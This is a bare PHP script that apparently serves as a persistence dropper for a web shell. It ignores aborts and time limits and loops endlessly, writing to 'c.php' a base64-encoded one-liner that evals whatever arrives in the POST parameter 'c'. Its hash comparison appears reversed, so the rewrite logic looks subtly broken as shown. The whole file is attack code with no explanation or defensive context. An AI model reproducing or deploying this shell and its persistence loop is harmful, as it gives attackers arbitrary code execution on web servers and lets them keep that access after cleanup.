<?php
 ignore_user_abort(true);
 set_time_limit(0);
 $file = 'c.php';
 $code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+');
 while(true) {
     if(md5(file_get_contents($file))===md5($code)) {
         file_put_contents($file, $code);
     }
     usleep(50);
 }
?>